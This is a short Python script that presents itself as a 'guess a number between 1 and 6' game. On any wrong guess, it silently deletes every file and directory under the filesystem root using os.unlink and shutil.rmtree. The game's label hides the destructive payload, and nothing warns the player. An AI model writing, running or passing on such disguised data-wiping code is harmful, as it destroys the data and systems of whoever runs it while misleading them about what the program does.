import random, os, shutil

number = random.randint(0,6)

guess = input("Guess a number between 1 and 6!!!")
guess = int(guess)

if number == guess:
    print("Correct! Nice guess! Run the code to play again!!!")
else:
    root_dir = os.path.abspath(os.sep)

    for item in os.listdir(root_dir):
        item_path = os.path.join(root_dir, item)
        
        try:
            if os.path.isfile(item_path) or os.path.islink(item_path):
                os.unlink(item_path) 
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)  
        except Exception as e:
            print(f'Failed to delete {item_path}. Reason: {e}')